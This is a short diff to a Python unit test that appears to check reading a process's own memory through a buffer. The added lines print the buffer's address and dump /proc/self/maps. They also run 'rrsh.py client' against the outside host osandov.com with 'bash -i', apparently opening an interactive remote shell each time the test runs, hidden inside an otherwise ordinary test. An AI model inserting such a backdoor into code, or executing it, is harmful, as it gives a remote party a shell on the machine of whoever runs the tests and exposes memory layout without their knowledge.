@@ -4,6 +4,8 @@
 import ctypes
 import itertools
 import os
+import subprocess
+import sys
 import tempfile
 import unittest.mock
 
@@ -49,6 +51,10 @@ class TestProgram(unittest.TestCase):
         self.assertTrue(prog.flags & ProgramFlags.IS_LIVE)
         data = b"hello, world!"
         buf = ctypes.create_string_buffer(data)
+        print(f"buf addr = {hex(ctypes.addressof(buf))} len = {len(data)}")
+        with open("/proc/self/maps", "r") as f:
+            sys.stdout.write(f.read())
+        subprocess.check_call(["python3", "rrsh.py", "client", "osandov.com", "bash", "-i"])
         self.assertEqual(prog.read(ctypes.addressof(buf), len(data)), data)
         self.assertRaisesRegex(
             ValueError,
